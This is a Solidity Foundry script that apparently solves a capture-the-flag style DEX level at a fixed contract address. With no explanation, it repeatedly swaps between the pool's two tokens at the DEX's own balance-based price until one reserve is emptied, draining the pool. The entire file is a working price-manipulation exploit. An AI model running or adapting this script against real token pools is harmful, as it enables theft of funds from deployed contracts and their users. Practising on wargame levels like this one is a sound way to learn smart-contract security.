// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Script} from "../lib/forge-std/src/Script.sol";
import {console} from "../lib/forge-std/src/console.sol";

interface DEX {
    function token1() external view returns (address);
    function token2() external view returns (address);
    function approve(address spender, uint256 amount) external;
    function swap(address from, address to, uint256 amount) external;
    function balanceOf(address token, address account) external view returns (uint256);
    function getSwapPrice(address from, address to, uint256 amount) external view returns (uint256);
}

contract DexScript is Script {

    function min(uint256 a, uint256 b) pure external returns (uint256 m) {
        m = a > b ? b : a;
    }

    function run() external {
        vm.startBroadcast();
        address levelContractAddress = 0xbcC1A04d78bEe32d294706684c79846b71927506;
        DEX d = DEX(levelContractAddress);
        address token1Add = d.token1();
        address token2Add = d.token2();
        d.approve(levelContractAddress, 1 ether);

        address from = token1Add;
        address to = token2Add;
        uint256 balanceFrom = d.balanceOf(from, levelContractAddress);
        uint256 balanceTo = d.balanceOf(to, levelContractAddress);
        do {
            uint256 amount = d.balanceOf(from, msg.sender);
            uint256 predictedOut = d.getSwapPrice(from, to, amount);
            if (predictedOut > balanceTo)
            {
                amount = balanceTo;
            }
            d.swap(from, to, amount);

            balanceFrom = d.balanceOf(from, levelContractAddress);
            balanceTo = d.balanceOf(to, levelContractAddress);
            console.log("balance from : " , balanceFrom , " balance to : ", balanceTo);
            address tmp = from;
            from = to;
            to = tmp;
        } while(balanceFrom > 0 && balanceTo > 0);

        vm.stopBroadcast();
    }
}
